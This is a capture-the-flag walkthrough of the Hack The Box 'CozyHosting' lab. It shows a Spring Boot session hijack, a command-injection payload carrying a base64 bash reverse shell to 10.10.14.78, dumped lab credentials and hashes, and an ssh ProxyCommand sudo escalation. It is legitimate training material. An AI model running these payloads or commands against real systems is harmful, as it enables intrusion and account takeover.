# HTB - CozyHosting

#### Ip: 10.10.11.230
#### Name: CozyHosting
#### Rating: Easy

----------------------------------------------------------------------

![CozyHosting.png](../assets/cozyhosting_assets/CozyHosting.png)

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up:

```text
┌──(ryan㉿kali)-[~/HTB/CozyHosting]
└─$ sudo nmap -p- --min-rate 10000 10.10.11.230 -sC -sV 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 11:18 CDT
Nmap scan report for 10.10.11.230
Host is up (0.073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
```

Lets add cozyhosting.htb to `/etc/hosts`

Checking out the page we find a simple site:

site.png

Kicking off some directory scanning with dirsearch we find a /actuator/sessions page. This must be running spring boot. 

Navigating to the page we find a username and a cookie or token:

cozyhosting_cookie.png

Looks like kanderson's session is open. 

Now that we have this token, we can head back to our directory fuzzing and find an `/admin` page. Navigate to the site (forwards to `/login` ) and replace the current session cookie with the kanderson's and navigate back to `/admin` to be logged in.

cozyhosting_admin.png

Scrolling down we see a potential for SSH access with a private key.

cozyhosting_ssh.png

Looking at the page source we find a `/executessh` endpoint that takes a POST request (this could also have been discovered in `/actuator/mappings`.

However when we enter the hostname cozyhosting and the username kanderson, the connection fails.

Lets capture this in Burp to inspect more closely.

Here again we can confirm the request fails:

cozyhosting_burp1.png

### Exploitation

Playing with these fields a bit we get an interesting error when trying command injection in the username field:

cozyhosting_burp2.png

So looks like the application is legitimately trying to run SSH, and also appears to be vulnerable to command injection. 

I had to fiddle with the payloads quite a bit, but a combination of base64 and `${IFS}` was able to catch me a reverse shell. 

First I encoded `/bin/bash -i >& /dev/tcp/10.10.14.78/443 0>&1` at revshells.com, then set up a listener, and passed in the command in Burp:

```
username=a;echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0Ljc4LzQ0MyAwPiYxCg==ddl|base64${IFS}-d|bash;
```

Catches me a shell back as app
```
┌──(ryan㉿kali)-[~/HTB/CozyHosting]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.11.230] 59244
bash: cannot set terminal process group (1063): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
app@cozyhosting:/app$ hostname
hostname
cozyhosting
```

Trying to access the user.txt flag in josh's home directory we get a permission denied:

```
app@cozyhosting:/app$ cd /home
app@cozyhosting:/home$ ls
josh
app@cozyhosting:/home$ cd josh
bash: cd: josh: Permission denied
app@cozyhosting:/home$ whoami
app
```

Poking around more I find a .jar file in `/app`.

I can copy that back over to my machine using a python3 http.server and wget:

cozyhosting_wget.png

using jd-gui we can open this up and begin inspecting it.

Firstly in application.properties I discovered postgres credentials, but was unable to authenticate as user postres with them.

cozyhosting_postgres_pw.png

I also found a login attempt to an internal site on port 8080 from kanderson:
```
curl", "localhost:8080/login", "--request", "POST", "--header", "Content-Type: application/x-www-form-urlencoded", "--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v" });
  }
```

Unfortunately kanderson is not a valid user in our shell, but we'll definitely keep this in mind. That said this was from a file called FakeUser.class, so we'll see..

Going back to the postres credentials, I decided to begin enumerating the DB on the target with them. I can login to postgres with `postgres:Vg&nvzAQ7XxR`

```
app@cozyhosting:/app$ psql -h localhost -U postgres
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```
I can list all databases with `\l`:

```
postgres-# \l
WARNING: terminal is not fully functional
Press RETURN to continue 
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)
```

I'll then change databases to cozyhosting:

```
postgres-# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
```

List tables:

```
cozyhosting-# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

The users table seems interesting:

```
cozyhosting=# select * from users;
WARNING: terminal is not fully functional
Press RETURN to continue 
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)
```
Cool. I think we've already discovered kanderson's hash from the `.jar` file, so lets try cracking the admin hash:

Nice, john was able to crack the hash for us:

cozyhosting_jtr.png

No dice using the cracked password for root, but it does work for josh:

```
app@cozyhosting:/app$ su root
Password: 
su: Authentication failure
app@cozyhosting:/app$ su josh
Password: 
josh@cozyhosting:/app$ whoami
josh
```

I'll go ahead and use this password to SSH in as josh, just for some persistence:

```
┌──(ryan㉿kali)-[~/HTB/CozyHosting]
└─$ ssh josh@10.10.11.230                                        
The authenticity of host '10.10.11.230 (10.10.11.230)' can't be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.230' (ED25519) to the list of known hosts.
josh@10.10.11.230's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
```

We can now grab the user.txt flag:

cozyhosting_user_flag.png

### Privilege Escalation

Running `sudo -l` to see what josh can run as sudo we see SSH:

```
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

This should make for an easy root. Lets head to GTFOBins.com for the command we'll need:

cozyhosting_gtfobins.png

`sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

Nice that worked, we can now grab the final flag:

cozyhosting_root_flag.png

Thanks for following along!

-Ryan

------------------------------------------------------
